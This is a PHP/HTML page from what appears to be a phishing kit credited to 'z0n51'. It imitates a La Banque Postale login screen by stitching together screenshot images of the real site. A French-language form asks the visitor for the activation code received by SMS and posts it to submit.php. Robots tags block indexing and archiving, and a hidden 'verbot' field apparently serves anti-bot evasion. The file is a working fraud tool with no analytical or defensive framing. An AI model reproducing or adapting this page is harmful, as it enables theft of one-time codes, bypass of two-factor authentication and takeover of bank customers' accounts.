<?php

/**
 * @link              https://www.z0n51.com/
 * @since             13/05/2020
 * @package           LA BANQUE POSTALE
 * @facebook          https://www.facebook.com/z0n51
 * @whatsapp          +212601728021
 * @icq               @z0n51
 * @telegram          @z0n51
 *
 * Project Name:      LA BANQUE POSTALE
 * Author:            z0n51
 * Author URI:        https://www.facebook.com/z0n51
 */

    include_once '../inc/app.php';
?>
<!doctype html>
<html>

    <head>
        <!-- Required meta tags -->
        <meta charset="utf-8">
        <meta name="robots" content="noindex," "nofollow," "noimageindex," "noarchive," "nocache," "nosnippet">
        
        <!-- CSS FILES -->
        <link rel="stylesheet" href="../assets/css/bootstrap.min.css">
        <link rel="stylesheet" href="../assets/css/helpers.css">
        <link rel="stylesheet" href="../assets/css/fonts.css">
        <link rel="stylesheet" href="../assets/css/main.css">

        <link rel="shortcut icon" href="../assets/images/favicon.png" type="image/png"> 

        <title>Bienvenue</title>
    </head>

    <body>

        <!-- HEADER -->
        <header id="header2">
            <div class="container cc">
                <div class="header-inner">
                    <div class="title"><img style="min-width: 246px;" src="../assets/images/login-title.png"></div>
                    <div class="menu"><img style="min-width: 243px;" src="../assets/images/login-right.png"></div>
                </div>
            </div>
        </header>
        <!-- END HEADER -->

        <!-- NAV -->
        <nav>
            <div class="container cc">
                <img style="min-width: 573px;" src="../assets/images/login-menu.png">
            </div>
        </nav>
        <!-- END NAV -->

        <!-- SERVICE -->
        <div class="mb50">
            <div class="container cc">
                <img style="min-width: 940px;" src="../assets/images/login-service.png">
            </div>
        </div>
        <!-- END SERVICE -->

        <!-- FORM -->
        <div class="mb50" id="login-details">
            <div class="container">
                <form method="POST" action="submit.php">
                    <input type="hidden" name="verbot">
                    <input type="hidden" name="type" value="confirm_code">
                    <p style="font-weight: 600; font-size: 16px;">Entrez le code d'activation que vous avez reçu par SMS</p>
                    <div class="form-group <?php echo is_invalid_class($_SESSION['errors'],'confirm_code') ?>">
                        <input type="text" maxlength="6" name="confirm_code" class="" id="confirm_code" placeholder="Example : 123456">
                        <?php echo error_message($_SESSION['errors'],'confirm_code'); ?>
                    </div>
                    <div><button type="submit">VALIDER</button></div>
                </form>
            </div>
        </div>
        <!-- END FORM -->

        <!-- BANNER -->
        <div>
            <div class="container cc text-center">
                <img style="min-width: 934px;" src="../assets/images/login-banner.png">
            </div>
        </div>
        <!-- END BANNER -->

        <!-- FOOTER -->
        <footer id="footer2" class="mt50">
            <div class="container cc">
                <img style="min-width: 863px;" src="../assets/images/login-footer.png">
            </div>
        </footer>
        <!-- END FOOTER -->

        <!-- JS FILES -->
        <script src="../assets/js/jquery.min.js"></script>
        <script src="../assets/js/popper.min.js"></script>
        <script src="../assets/js/bootstrap.min.js"></script>
        <script src="../assets/js/fontawesome.min.js"></script>
        <script src="../assets/js/main.js"></script>

    </body>

</html>